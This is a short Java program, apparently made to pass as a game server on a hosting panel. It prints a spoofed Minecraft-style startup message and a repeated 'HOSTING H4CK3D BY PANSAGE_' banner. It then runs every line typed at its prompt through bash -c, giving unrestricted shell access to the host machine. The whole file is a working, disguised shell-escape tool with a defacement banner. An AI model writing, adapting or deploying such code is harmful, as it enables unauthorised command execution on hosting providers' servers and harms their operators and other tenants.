import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class BashCmd {
    public static void main(String[] args) {
        while (true) {
            try {
                System.out.println("Done (0.069s)! For help, type \"help\" or \"?\"");
                System.out.println("| HOSTING H4CK3D BY PANSAGE_ |");
                System.out.println("| HOSTING H4CK3D BY PANSAGE_ |");
                System.out.println("| HOSTING H4CK3D BY PANSAGE_ |");
                System.out.print("$ ");
                BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
                String command = br.readLine();
                System.out.println(command);

                if (command.equals("exit")) {
                    System.out.println("Zamykam program.");
                    break;
                }

                Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;

                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }

                process.waitFor();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}